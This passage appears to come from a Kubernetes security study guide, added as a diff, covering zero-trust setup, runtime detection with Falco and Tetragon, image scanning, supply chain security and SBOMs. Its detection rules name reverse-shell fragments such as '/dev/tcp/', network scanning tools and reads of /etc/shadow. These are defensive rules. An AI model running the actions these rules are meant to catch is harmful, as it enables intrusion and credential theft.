+  selector:
+    matchLabels:
+      app: api
+  jwtRules:
+    - issuer: "https://accounts.example.com"
+      jwksUri: "https://accounts.example.com/.well-known/jwks.json"
+```
+
+Requests need valid JWT. Tokens verified.
+
+**Component 6: API server access**
+
+Use OIDC for user authentication:
+
+```yaml
+# kube-apiserver flags:
+--oidc-issuer-url=https://accounts.example.com
+--oidc-client-id=kubernetes
+--oidc-username-claim=email
+--oidc-groups-claim=groups
+```
+
+Users authenticate via SSO, not static credentials.
+
+**Component 7: Secret management**
+
+Secrets in external store with identity-based access:
+
+```yaml
+# Vault with K8s auth:
+apiVersion: external-secrets.io/v1beta1
+kind: ExternalSecret
+spec:
+  secretStoreRef:
+    name: vault
+  data:
+    - secretKey: password
+      remoteRef:
+        key: secret/data/my-app/db
+```
+
+Vault verifies pod's SA, returns secret. Different SA = no access.
+
+**Component 8: Continuous verification**
+
+- Audit logs of all access
+- Anomaly detection
+- Runtime threat monitoring (Falco)
+
+```yaml
+# Falco rule:
+- rule: Unauthorized Process
+  desc: Process not in allowlist
+  condition: spawned_process and not proc.name in (allowed_procs)
+  output: Suspicious process (user=%user.name process=%proc.name)
+  priority: CRITICAL
+```
+
+**Component 9: Workload attestation**
+
+Verify workloads at runtime:
+
+```bash
+# SPIRE for SPIFFE identities:
+# Each workload gets cryptographic identity
+# Verified by SPIRE Server
+```
+
+**Zero-trust architecture:**
+
+```
+User → OIDC auth → API server (RBAC) → Application
+                                          ↓ (mTLS)
+                                        Backend (AuthZ)
+                                          ↓ (mTLS + AuthZ)
+                                       Database (cert auth)
+```
+
+Every hop authenticated and authorized.
+
+**Implementation steps:**
+
+**Step 1: Service mesh**
+
+Deploy Istio, Linkerd, or similar:
+
+```bash
+istioctl install --set profile=default
+```
+
+**Step 2: mTLS strict mode**
+
+```yaml
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+  namespace: istio-system
+spec:
+  mtls:
+    mode: STRICT
+```
+
+Cluster-wide strict mTLS.
+
+**Step 3: Authorization policies**
+
+For each service, define who can access:
+
+```yaml
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: api-policy
+spec:
+  selector:
+    matchLabels:
+      app: api
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/web/sa/web-app"]
+```
+
+Default-deny, then explicit allows.
+
+**Step 4: NetworkPolicies**
+
+Defense in depth:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+spec:
+  podSelector: {}
+  policyTypes: [Ingress, Egress]
+```
+
+**Step 5: External authentication**
+
+Configure OIDC for kubectl:
+
+```yaml
+# kubeconfig:
+users:
+  - name: user
+    user:
+      auth-provider:
+        name: oidc
+        config:
+          idp-issuer-url: https://accounts.example.com
+          client-id: kubernetes
+```
+
+Cluster auth via SSO.
+
+**Step 6: Secrets to external store**
+
+Migrate K8s Secrets to Vault/AWS Secrets Manager.
+
+**Step 7: Continuous monitoring**
+
+Deploy Falco for runtime threats. Audit logs to SIEM.
+
+**Challenges:**
+
+**Challenge 1: Operational complexity**
+
+Service mesh + policies + identity = many moving parts.
+
+**Challenge 2: Performance overhead**
+
+mTLS adds latency (~1-3ms typically).
+
+**Challenge 3: Legacy integration**
+
+Apps that don't speak mTLS natively. Service mesh sidecars help but adoption takes time.
+
+**Challenge 4: Policy management**
+
+Many policies, easy to make mistakes. GitOps and tooling essential.
+
+**Challenge 5: Cross-cluster zero-trust**
+
+Mesh extends across clusters with proper setup. Complex.
+
+**Benefits realized:**
+
+1. **Breach containment**: compromised pod can't move laterally easily
+2. **Audit trail**: every connection logged
+3. **Granular access**: per-service, per-method
+4. **Compliance**: meets strict requirements
+5. **Defense in depth**: multiple layers
+
+**Production scenarios:**
+
+1. **Banking implemented zero-trust**: Regulatory pressure. Istio mTLS strict, AuthorizationPolicies, NetworkPolicies, external secrets. 18-month migration. Achieved compliance.
+
+2. **Breach blocked**: Attacker compromised one app. mTLS prevented lateral movement (no certs to talk to other services). NetworkPolicies blocked even attempts. Damage contained to one workload.
+
+3. **API key elimination**: Replaced API keys for service-to-service auth with mTLS identities. No more secret rotation for inter-service. Cleaner architecture.
+
+4. **Multi-cluster mesh**: Apps across 5 clusters. Istio multi-cluster with mTLS. Apps in different clusters authenticate cryptographically. Zero-trust spanning clusters.
+
+5. **Compliance audit**: SOC 2 audit verified all internal traffic mTLS, identity-based authorization, comprehensive audit logging. Passed without findings.
+
+---
+
+## 235. Explain runtime security tools
+
+Runtime security tools detect threats while containers are running. Static security (image scanning, policies) catches some issues; runtime catches what gets past.
+
+**Why runtime security:**
+
+Static security misses:
+- Zero-day exploits
+- Misuse of legitimate features
+- Insider threats
+- Configuration drift
+- Behavioral anomalies
+
+**Categories of runtime security:**
+
+**Category 1: Behavior monitoring**
+
+Watch what processes do:
+- Syscalls made
+- Files accessed
+- Network connections
+- Process execution
+
+**Category 2: Threat detection**
+
+Identify known attack patterns:
+- Crypto mining
+- Container escape attempts
+- Reverse shells
+- Privilege escalation
+
+**Category 3: Network monitoring**
+
+Watch network traffic:
+- Unexpected connections
+- Data exfiltration
+- C2 communication
+- Lateral movement
+
+**Category 4: Compliance**
+
+Ensure runtime adheres to policies:
+- CIS Kubernetes Benchmark
+- File integrity monitoring
+- Configuration auditing
+
+**Major tools:**
+
+**Falco:**
+
+CNCF graduated project, the de facto standard.
+
+**Architecture:**
+
+```yaml
+# DaemonSet on every node:
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: falco
+spec:
+  template:
+    spec:
+      containers:
+        - name: falco
+          image: falcosecurity/falco:latest
+          securityContext:
+            privileged: true
+```
+
+**How it works:**
+
+- Kernel-level monitoring (eBPF or kernel module)
+- Detects syscalls, file ops, network activity
+- Compares against rules
+- Alerts on matches
+
+**Rule example:**
+
+```yaml
+- rule: Terminal shell in container
+  desc: A shell was used as the entrypoint or exec for a container
+  condition: >
+    spawned_process and container
+    and shell_procs and proc.tty != 0
+  output: >
+    A shell was spawned in a container with an attached terminal 
+    (user=%user.name container=%container.id shell=%proc.name parent=%proc.pname tty=%proc.tty)
+  priority: WARNING
+  tags: [container, shell, mitre_execution]
+```
+
+If someone `kubectl exec` into a pod and starts a shell: alert.
+
+**Other example rules:**
+
+```yaml
+# Crypto mining:
+- rule: Detect crypto miners
+  condition: spawned_process and proc.name in (cryptominers)
+  output: Crypto miner detected
+  priority: CRITICAL
+
+# Privilege escalation:
+- rule: Privilege Escalation
+  condition: spawned_process and proc.name=sudo
+  output: Sudo used in container
+  priority: WARNING
+
+# Sensitive file access:
+- rule: Read sensitive file
+  condition: open_read and fd.name in (/etc/shadow, /etc/passwd)
+  output: Sensitive file accessed
+  priority: ERROR
+```
+
+**Falco outputs:**
+
+- stdout (default)
+- gRPC for downstream consumption
+- Webhooks
+- Syslog
+- Files
+
+Common integration:
+- Falco → Falcosidekick → Slack/PagerDuty/SIEM
+
+**Tetragon:**
+
+eBPF-based runtime security from Cilium.
+
+```yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: file-monitoring
+spec:
+  kprobes:
+    - call: "sys_openat"
+      syscall: true
+      args:
+        - index: 1
+          type: "string"
+      selectors:
+        - matchArgs:
+            - index: 1
+              operator: "Equal"
+              values:
+                - "/etc/shadow"
+          matchActions:
+            - action: Sigkill
+```
+
+Can not just detect but enforce (kill process attempting bad action).
+
+Powerful because eBPF, very performant.
+
+**Sysdig Secure (commercial):**
+
+Comprehensive runtime + image security + compliance:
+- Falco-based detection
+- Vulnerability management
+- Compliance reporting
+- Forensics
+
+**Aqua Security (commercial):**
+
+Similar full-platform:
+- Image scanning
+- Runtime protection
+- Network security
+- Compliance
+
+**Prisma Cloud / Twistlock (commercial):**
+
+Palo Alto Networks' offering. Comprehensive cloud-native security.
+
+**Specific use cases:**
+
+**Use case 1: Detect container escape**
+
+```yaml
+- rule: Container escape
+  condition: >
+    container and proc.name in (host_executables)
+    and not container.privileged
+  output: Possible container escape attempt
+  priority: CRITICAL
+```
+
+Process from container running on host = escape.
+
+**Use case 2: Crypto miner detection**
+
+```yaml
+- rule: Crypto miner pool
+  condition: >
+    container and outbound and 
+    (fd.sip in (crypto_miner_pools) or fd.name contains "stratum")
+  output: Crypto miner connecting to pool
+  priority: CRITICAL
+```
+
+Detect known mining pool connections.
+
+**Use case 3: Reverse shell detection**
+
+```yaml
+- rule: Reverse shell
+  condition: >
+    spawned_process and 
+    proc.cmdline contains "bash -i" or 
+    proc.cmdline contains "/dev/tcp/"
+  output: Possible reverse shell
+  priority: CRITICAL
+```
+
+**Use case 4: Suspicious commands**
+
+```yaml
+- rule: Suspicious commands
+  condition: >
+    spawned_process and 
+    proc.name in (nmap, nc, ncat, netcat, masscan, wireshark)
+  output: Suspicious tool in container
+  priority: WARNING
+```
+
+Network scanning tools in container = suspicious.
+
+**Use case 5: File integrity**
+
+```yaml
+- rule: Modify system files
+  condition: >
+    open_write and 
+    fd.name startswith /etc and 
+    not user_known_change_dirs
+  output: System file modified
+  priority: ERROR
+```
+
+**Integration with response:**
+
+Detection alone isn't enough. Respond:
+
+**Manual:**
+
+- Alert to on-call
+- Page security team
+- Slack notification
+
+**Automated:**
+
+```yaml
+# Falcosidekick + custom webhook:
+falco → falcosidekick → webhook → Lambda → response action
+```
+
+Possible actions:
+- Kill offending pod
+- Quarantine pod (NetworkPolicy isolation)
+- Snapshot for forensics
+- Block from CIDR
+
+**Tetragon enforcement:**
+
+```yaml
+matchActions:
+  - action: Sigkill   # Kill the process
+```
+
+In-kernel enforcement, faster than detection + action.
+
+**Compliance and audit:**
+
+Runtime tools also support compliance:
+
+- File integrity monitoring (FIM)
+- Configuration auditing
+- Process whitelisting
+- Compliance reports (CIS, PCI, HIPAA)
+
+```bash
+# kube-bench: CIS Kubernetes Benchmark check
+kube-bench run --targets node,master
+```
+
+**Considerations:**
+
+**Consideration 1: Performance**
+
+Kernel-level monitoring has overhead:
+- Falco: 1-5% CPU
+- Tetragon (eBPF): often <1%
+- Some commercial tools: variable
+
+Test in your environment.
+
+**Consideration 2: Alert fatigue**
+
+Default rules generate many alerts. Tune:
+- Allowlist legitimate behaviors
+- Adjust severities
+- Custom rules for your environment
+
+**Consideration 3: False positives**
+
+Legitimate actions look suspicious:
+- Admin work
+- Debugging
+- Maintenance scripts
+
+Whitelist or contextualize.
+
+**Consideration 4: Coverage**
+
+Monitor where matters:
+- Production: definitely
+- Staging: maybe
+- Dev: probably not (lots of legitimate "suspicious" activity)
+
+**Consideration 5: Investigation**
+
+When alerts fire, need to investigate:
+- Logs aggregation
+- Forensics capability
+- Incident response process
+
+Tools alone don't secure; people responding to them do.
+
+**Falco best practices:**
+
+1. **Start with default rules**, observe
+2. **Tune for environment**: silence false positives
+3. **Add custom rules** for your specific concerns
+4. **Integrate with SIEM**: don't just log, correlate
+5. **Test rules**: actually trigger them, verify detection
+
+**Production scenarios:**
+
+1. **Crypto miner caught**: Falco detected unusual outbound connections + high CPU. Within minutes, identified mining pod. Killed and investigated. Compromised via vulnerable Jenkins.
+
+2. **Tetragon prevented privilege escalation**: Container had vulnerability, attacker tried to escape. Tetragon detected at kernel level, killed the process. Damage prevented.
+
+3. **Compliance reporting via Sysdig**: Compliance auditor needed evidence of PCI controls. Sysdig generated reports showing file integrity, process monitoring, etc. Passed audit.
+
+4. **Reverse shell detection**: App pod compromised via SQL injection. Attacker tried to establish reverse shell. Falco rule fired immediately. Pod isolated via NetworkPolicy automation. Investigation followed.
+
+5. **Tuning reduced alert fatigue**: Initial Falco install fired 10k alerts/day, mostly noise. Tuned rules, allowlisted legitimate activity. Down to 50/day, mostly real concerns. Team actually reviewed each.
+
+---
+
+## 236. How do you scan container images?
+
+Image scanning identifies vulnerabilities and risks in container images before they're deployed. Done well, it prevents introducing known issues.
+
+**What's scanned:**
+
+- **OS packages**: deb, rpm, alpine packages with CVEs
+- **Language libraries**: npm, pip, Maven, etc.
+- **Configuration**: insecure settings, root user
+- **Secrets**: embedded passwords, keys
+- **Malware**: known malicious code
+- **Image structure**: layers, base images
+
+**Scanning tools:**
+
+**Trivy (Aqua Security):**
+
+Most popular, open source:
+
+```bash
+# Scan an image:
+trivy image my-app:v1
+
+# Output:
+# my-app:v1 (alpine 3.18.4)
+# ================================
+# Total: 3 (HIGH: 2, CRITICAL: 1)
+# 
+# CVE-2023-1234   CRITICAL  openssl   3.0.10-r0   3.0.11-r0  Buffer overflow
+# ...
+```
+
+**Severity filters:**
+
+```bash
+# Only critical/high:
+trivy image --severity HIGH,CRITICAL my-app:v1
+
+# Fail build on critical:
+trivy image --severity CRITICAL --exit-code 1 my-app:v1
+```
+
+**Grype (Anchore):**
+
+```bash
+# Scan:
+grype my-app:v1
+
+# JSON output:
+grype my-app:v1 -o json
+```
+
+**Snyk:**
+
+Commercial with free tier:
+
+```bash
+snyk container test my-app:v1
+```
+
+Strong on language dependencies.
+
+**Clair:**
+
+Project Quay's scanner. Built for registry integration.
+
+**Twistlock / Prisma Cloud:**
+
+Enterprise, comprehensive.
+
+**Scanning at different stages:**
+
+**Stage 1: Local development**
+
+```bash
+# Pre-commit hook:
+trivy fs --severity HIGH .
+```
+
+Catches issues early. Optional.
+
+**Stage 2: CI/CD build**
+
+```yaml
+# GitLab CI:
+build:
+  script:
+    - docker build -t my-app:$CI_COMMIT_SHA .
+    - trivy image --severity CRITICAL --exit-code 1 my-app:$CI_COMMIT_SHA
+    - docker push my-app:$CI_COMMIT_SHA
+```
+
+Block build on critical findings.
+
+**Stage 3: Registry**
+
+Many registries scan on push:
+
+**AWS ECR:**
+
+```bash
+# Enable scan on push:
+aws ecr put-image-scanning-configuration \
+  --repository-name my-app \
+  --image-scanning-configuration scanOnPush=true
+```
+
+**GCP Artifact Registry:**
+
+Built-in scanning.
+
+**Harbor:**
+
+```yaml
+# Harbor configuration:
+scanner: Trivy
+auto_scan: true
+```
+
+**Docker Hub:**
+
+Paid feature.
+
+**Stage 4: Continuous (production)**
+
+Scan running images regularly:
+
+```bash
+# Get running images:
+kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u | while read img; do
+  trivy image --severity CRITICAL --quiet $img
+done
+```
+
+New CVEs discovered after deploy. Continuous catches them.
+
+**Stage 5: Admission control**
+
+Block unscanned images:
+
+```yaml
+# OPA Gatekeeper / Kyverno policy:
+# Require recent scan
+# Block if critical CVEs
+```
+
+**Scan results interpretation:**
+
+**Severity levels:**
+
+- **Critical**: must fix, RCE-class
+- **High**: should fix soon
+- **Medium**: address eventually
+- **Low**: informational
+
+**Fixable vs unfixable:**
+
+```bash
+trivy image --severity HIGH,CRITICAL --ignore-unfixed my-app:v1
+```
+
+Focus on what has patches available. Unfixed vulnerabilities you can't do anything about (until vendor patches).
+
+**Vulnerability sources:**
+
+- NVD (National Vulnerability Database)
+- Vendor advisories (RedHat, Ubuntu, Alpine)
+- GitHub Security Advisories
+- Tools' own databases
+
+**False positives:**
+
+Scanner says vulnerable, but not exploitable in your context:
+- Package present but not used
+- Vulnerability requires specific config
+
+Use ignore files:
+
+```yaml
+# .trivyignore:
+CVE-2023-1234   # Not exploitable in our usage
+CVE-2023-5678   # Vendor confirms not vulnerable
+```
+
+**Reducing vulnerabilities:**
+
+**Strategy 1: Minimal base images**
+
+```dockerfile
+# Bad: 200+ vulnerabilities baseline:
+FROM ubuntu:22.04
+
+# Better: ~50 vulnerabilities:
+FROM alpine:3.18
+
+# Best: ~5 vulnerabilities:
+FROM gcr.io/distroless/static:nonroot
+```
+
+Smaller image = fewer components = fewer vulnerabilities.
+
+**Strategy 2: Up-to-date base**
+
+```bash
+# Periodically rebuild with new base:
+docker pull alpine:latest
+docker build -t my-app:v1 .
+```
+
+Base image updates fix CVEs.
+
+**Strategy 3: Pin specific versions**
+
+```dockerfile
+# Bad: floating tags:
+FROM alpine
+
+# Better: specific tag:
+FROM alpine:3.18.4
+
+# Best: digest:
+FROM alpine@sha256:abc123...
+```
+
+Reproducible, predictable.
+
+**Strategy 4: Multi-stage builds**
+
+```dockerfile
+FROM golang:1.21 AS builder
+# Build artifacts
+
+FROM scratch
+COPY --from=builder /app /
+```
+
+Build tools not in final image, fewer vulnerabilities.
+
+**Strategy 5: Update dependencies**
+
+```bash
+# npm:
+npm audit fix
+
+# pip:
+pip list --outdated
+
+# Maven:
+mvn versions:display-dependency-updates
+```
+
+Regular dependency updates.
+
+**SBOM (Software Bill of Materials):**
+
+```bash
+# Generate SBOM:
+trivy image --format spdx-json my-app:v1 > sbom.json
+
+# Or syft:
+syft my-app:v1 -o spdx-json > sbom.json
+```
+
+Lists all components in image. Useful for:
+- Vulnerability tracking
+- License compliance
+- Supply chain analysis
+
+**Image signing:**
+
+After scanning, sign verified images:
+
+```bash
+# Sign with Cosign:
+cosign sign --key cosign.key my-app:v1
+
+# Verify before deploy:
+cosign verify --key cosign.pub my-app:v1
+```
+
+Combine: scan + sign = trusted image.
+
+**CI/CD integration patterns:**
+
+**Pattern 1: Block on critical**
+
+```yaml
+stages:
+  - build
+  - scan
+  - push
+
+scan:
+  stage: scan
+  script:
+    - trivy image --severity CRITICAL --exit-code 1 $IMAGE
+```
+
+Critical CVE = build fails.
+
+**Pattern 2: Threshold-based**
+
+```yaml
+scan:
+  script: |
+    HIGH_COUNT=$(trivy image -f json $IMAGE | jq '[.Results[].Vulnerabilities | select(.Severity == "HIGH")] | length')
+    if [ $HIGH_COUNT -gt 10 ]; then
+      exit 1
+    fi
+```
+
+Allow some HIGH but limit count.
+
+**Pattern 3: Allow with exceptions**
+
+```yaml
+scan:
+  script:
+    - trivy image --ignorefile .trivyignore --severity CRITICAL $IMAGE
+```
+
+Specific exceptions allowed.
+
+**Pattern 4: Report only**
+
+```yaml
+scan:
+  script:
+    - trivy image --format json $IMAGE > scan-report.json
+  artifacts:
+    paths: [scan-report.json]
+```
+
+Scan but don't block. Report for review.
+
+**Continuous monitoring:**
+
+```yaml
+# CronJob to scan running images:
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: image-scanner
+spec:
+  schedule: "0 2 * * *"   # Daily 2 AM
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+            - name: scanner
+              image: aquasec/trivy
+              command:
+                - /bin/sh
+                - -c
+                - |
+                  # Get all running images
+                  IMAGES=$(kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u)
+                  for IMG in $IMAGES; do
+                    trivy image --severity CRITICAL --quiet $IMG
+                  done
+```
+
+**Production scenarios:**
+
+1. **CI gating saved from Log4Shell**: Image scanning in CI flagged Log4j vulnerability immediately. Build blocked. Updated dependency before deploy. Never went to production.
+
+2. **Continuous scan found new CVE**: Image built 2 months ago, deployed in production. New CVE published affecting it. Continuous scan flagged. Patched within day.
+
+3. **Minimal images dropped vulnerability count**: Migrated from ubuntu:22.04 to distroless. CVE count went from 250 to 8. Same functionality.
+
+4. **False positive frustration**: Trivy flagged "vulnerable" Java library. Investigation showed library used safely (not the vulnerable code path). Added to ignore list with explanation.
+
+5. **SBOM for compliance**: SOC 2 audit required SBOM for all production images. Trivy generated SPDX SBOM in CI. Attached to images via Cosign attestation. Compliance met.
+
+---
+
+## 237. Explain supply chain security
+
+Supply chain security protects against attacks on the software production pipeline. From source code to runtime, every step is a potential target.
+
+**The supply chain:**
+
+```
+Source Code → Dependencies → Build → Test → Image → Registry → Deploy → Runtime
+```
+
+Each step is attackable:
+- Compromised developer accounts
+- Malicious dependencies
+- Build server compromise
+- Image tampering
+- Registry attacks
+- Deployment manipulation
+
+**Famous supply chain attacks:**
+
+- **SolarWinds (2020)**: build server compromise, malicious code added
+- **Codecov (2021)**: compromised CI tool affected many companies
+- **npm package compromises**: malicious packages on npm
+- **Docker Hub image manipulation**: malicious images
+
+**SLSA framework:**
+
+Supply-chain Levels for Software Artifacts. Standardized approach:
+
+**SLSA Level 1:**
+- Build process documented
+- Provenance available
+
+**SLSA Level 2:**
+- Version-controlled source
+- Build platform that generates provenance
+- Hosted build service
+
+**SLSA Level 3:**
+- Source platform with strong access control
+- Hardened build platform
+- Authenticated provenance
+
+**SLSA Level 4:**
+- Two-person review of all changes
+- Hermetic, reproducible builds
+
+Most orgs aim for SLSA 2-3.
+
+**Defense-in-depth strategies:**
+
+**Strategy 1: Secure source**
+
+- Branch protection rules
+- Required code reviews
+- Signed commits:
+
+```bash
+# Sign commits with GPG:
+git config commit.gpgsign true
+git config user.signingkey <key-id>
+```
+
+- 2FA for repository access
+- Limit who can push to main
+
+**Strategy 2: Dependency security**
+
+```bash
+# npm:
+npm audit
+npm audit fix
+
+# pip:
+pip-audit
+
+# Go:
+nancy sleuth
+govulncheck ./...
+
+# Java:
+mvn dependency-check:check
+```
+
+Regular dependency scanning.
+
+**Lock files:**
+
+```
+package-lock.json (npm)
+poetry.lock (Python)
+go.sum (Go)
+```
+
+Lock to specific versions, prevent surprise updates.
+
+**Dependency review:**
+
+For critical deps, manual review. Pin to specific versions:
+
+```json
+// package.json:
+{
+  "dependencies": {
+    "express": "4.18.2",   // Exact version, not "^4.18.0"
+  }
+}
+```
+
+**Allowlisting:**
+
+```yaml
+# Allow only from known sources:
+[[constraint]]
+  name = "github.com/our-org/*"
+```
+
+**Strategy 3: Build security**
+
+Build environment hardened:
+
+- Ephemeral build runners (fresh per build)
+- Network isolation
+- No persistent storage between builds
+- Audit logging
+
+**Reproducible builds:**
+
+```bash
+# Same inputs → same outputs
+# Verify integrity:
+sha256sum image1.tar
+sha256sum image2.tar
+# Should match if reproducible
+```
+
+**Strategy 4: Build provenance**
+
+Cryptographic record of how artifact was built:
+
+```bash
+# Sigstore Cosign with attestation:
+cosign attest --predicate provenance.json \
+  --key cosign.key my-app:v1
+```
+
+Provenance includes:
+- Source repo and commit
+- Build platform and configuration
+- Build inputs (base image, etc.)
+- Build outputs
+
+Verify later:
+
+```bash
+cosign verify-attestation --key cosign.pub my-app:v1
+```
+
+**Strategy 5: Image signing**
+
+```bash
+# Sign:
+cosign sign --key cosign.key my-app:v1
+
+# Verify:
+cosign verify --key cosign.pub my-app:v1
+```
+
+Only signed images deployed.
+
+**Strategy 6: SBOM**
+
+Track all components:
+
+```bash
+# Generate SBOM:
+syft my-app:v1 -o spdx-json > sbom.json
+
+# Attach to image:
+cosign attest --predicate sbom.json --key cosign.key my-app:v1
+```
+
+Visibility into what's in your software.
+
+**Strategy 7: Vulnerability tracking**
+
+Continuous scanning of:
+- Source code
+- Dependencies
+- Container images
+- Deployed workloads
+
+Tools:
+- Snyk
+- Dependabot
+- Renovate
+- Trivy
+
+**Strategy 8: Admission control**
+
+At deploy time, verify:
+
+```yaml
+# Kyverno policy:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: verify-supply-chain
+spec:
+  rules:
+    - name: verify-images
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      verifyImages:
+        - imageReferences:
+            - "myregistry.com/*"
+          attestors:
+            - count: 1
+              entries:
+                - keys:
+                    publicKeys: <our-public-key>
+          attestations:
+            - type: SBOM
+              attestors:
+                - count: 1
+                  entries:
+                    - keys:
+                        publicKeys: <our-public-key>
+```
+
+Image must be signed AND have SBOM attestation.
+
+**Strategy 9: Runtime verification**
+
+```bash
+# At runtime, verify:
+cosign verify --key cosign.pub <image-pulled-by-pod>
+```
+
+Continuous verification, not just at deploy.
+
+**Strategy 10: Incident response**
+
+When supply chain compromise detected:
+
+1. **Identify affected images**:
+```bash
+# Find images using compromised package:
+trivy image --severity CRITICAL --pkg compromised-pkg my-app:v1
+```
+
+2. **Quarantine**:
+```bash
+# Block deployment of affected images
+```
+
+3. **Rebuild**:
+```bash
+# With clean dependencies
+```
+
+4. **Redeploy**:
+```bash
+# Across all environments
+```
+
+5. **Investigate**:
+```bash
+# How did it get in? Audit pipelines
+```
+
+**Sigstore ecosystem:**
+
+Free, open-source supply chain security:
+
+**Cosign**: signing and verification
+**Fulcio**: certificate authority (free certs)
+**Rekor**: transparency log
+
+```bash
+# Keyless signing (Sigstore):
+cosign sign my-app:v1
+# Uses OIDC, no keys to manage
+# Logged in Rekor (public transparency log)
+```
+
+**Verifiable build platforms:**
+
+**GitHub Actions:**
+
+```yaml
+# OIDC integration with Sigstore:
+- uses: sigstore/cosign-installer@v3
+- run: cosign sign --identity-token $TOKEN my-app:v1
+```
+
+**GitLab CI:**
+
+Similar OIDC integration.
+
+**Tekton Chains:**
+
+Kubernetes-native CI that auto-generates provenance.
+
+**Supply chain examples:**
+
+**Example: GitHub Actions with full provenance**
+
+```yaml
+name: build-and-sign
+permissions:
+  id-token: write   # For OIDC
+  contents: read
+  packages: write
+  attestations: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - uses: docker/build-push-action@v5
+        id: build
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
+      
+      - uses: actions/attest-build-provenance@v1
+        with:
+          subject-name: ghcr.io/${{ github.repository }}
+          subject-digest: ${{ steps.build.outputs.digest }}
+          push-to-registry: true
+      
+      - uses: sigstore/cosign-installer@v3
+      - run: |
+          cosign sign --yes \
+            ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
+```
+
+Auto-generates provenance, signs image, all keyless.
+
+**Production scenarios:**
+
+1. **Log4Shell incident response**: Discovered all affected images via SBOM database. Identified specific deployments. Patched and redeployed within hours. SBOMs proved invaluable.
+
+2. **Compromised dependency caught early**: npm package added malicious code. Dependabot flagged version change. Reviewed PR carefully, found the issue. Stayed on old version, raised issue.
+
+3. **Cosign for production trust**: All production images signed in CI. Kyverno verified at deploy. Unsigned images blocked. Pipeline tampering would break signing.
+
+4. **SLSA 3 achievement**: Banking app moved to SLSA 3. GitHub branch protection, signed commits, hardened builds, provenance attestation. Compliance requirement met.
+
+5. **Sigstore keyless eliminated key management**: Previously managed Cosign keys per project. Migrated to Sigstore keyless. OIDC identity, transparency log. Easier and more secure.
+
+---
+
+## 238. What is SBOM?
+
+SBOM (Software Bill of Materials) is a comprehensive inventory of all components in a software product. It's becoming required for supply chain security and compliance.
+
+**What's in an SBOM:**
+
+- **Components**: libraries, frameworks, modules used
+- **Versions**: exact versions of each
+- **Licenses**: license types (MIT, Apache, GPL, etc.)
+- **Source**: where each component came from
+- **Hashes**: cryptographic hashes for verification
+- **Relationships**: dependencies between components
+
+**Why SBOMs matter:**
+
+**Reason 1: Vulnerability management**
+
+When a CVE drops (Log4Shell, Spring4Shell):
+- Without SBOM: scramble to find affected systems
+- With SBOM: query, immediately know what's vulnerable
+
+```bash
+# Find all images with vulnerable package:
+grep "log4j-core.*2.14" *.sbom.json
+```
+
+**Reason 2: License compliance**
+
+Track licenses across software:
+- GPL contamination (viral license)
+- Commercial vs. open source
+- Restrictive licenses incompatible with use case
+
+**Reason 3: Regulatory compliance**
+
+Increasingly required:
+- US Executive Order 14028 (federal software)
+- EU Cyber Resilience Act
+- Industry-specific (financial, healthcare)
+
+**Reason 4: Risk assessment**
+
+Understand your dependencies:
+- Critical components
+- Single points of failure
+- Outdated/unmaintained software
+
+**SBOM formats:**
+
+**SPDX (Software Package Data Exchange):**
+
+Linux Foundation standard:
+
+```json
+{
+  "spdxVersion": "SPDX-2.3",
+  "dataLicense": "CC0-1.0",
+  "SPDXID": "SPDXRef-DOCUMENT",
+  "name": "my-app-sbom",
+  "packages": [
+    {
+      "SPDXID": "SPDXRef-Package-log4j",
+      "name": "log4j-core",
+      "version": "2.17.1",
+      "licenseConcluded": "Apache-2.0",
+      "downloadLocation": "https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.1/log4j-core-2.17.1.jar",
+      "checksums": [
+        {
+          "algorithm": "SHA-256",
+          "checksumValue": "abc123..."
+        }
+      ]
+    }
+  ]
+}
+```
+
+**CycloneDX:**
+
+OWASP standard, focused on security:
+
+```json
+{
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.5",
+  "components": [
+    {
+      "type": "library",
+      "bom-ref": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1",
+      "name": "log4j-core",
+      "version": "2.17.1",
+      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1",
+      "licenses": [
+        {
+          "license": {
+            "id": "Apache-2.0"
+          }
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Comparison:**
+
+| Aspect | SPDX | CycloneDX |
+|--------|------|-----------|
+| Origin | Linux Foundation | OWASP |
+| Focus | Comprehensive | Security-focused |
+| Maturity | Older, established | Modern |
+| Adoption | Wide | Growing fast |
+
+Both widely supported. Tools usually output either.
+
+**Generating SBOMs:**
+
+**Syft (Anchore):**
+
+```bash
+# From image:
+syft my-app:v1 -o spdx-json > sbom.json
+
+# From directory:
+syft dir:/path/to/project -o cyclonedx-json
+```
+
+**Trivy:**
+
+```bash
+trivy image --format spdx-json --output sbom.json my-app:v1
+```
+
+**Build tools:**
+
+```bash
+# Maven:
+mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
+
+# npm:
+npm install -g @cyclonedx/cyclonedx-npm
+cyclonedx-npm
+
+# Go:
+syft dir:. -o cyclonedx
+```
+
+**Docker Buildx:**
+
+```bash
+# Generate during build:
+docker buildx build --sbom=true --provenance=true -t my-app:v1 .
+```
+
+**Where SBOMs live:**
+
+**Option 1: Attached to image**
+
+```bash
+# Cosign attestation:
+cosign attest --predicate sbom.json --key cosign.key my-app:v1
+```
+
+SBOM stored with image in registry.
+
+**Option 2: Separate file**
+
+```
+artifacts/
+  my-app-v1.tar.gz
+  my-app-v1.sbom.json
+  my-app-v1.sig
+```
+
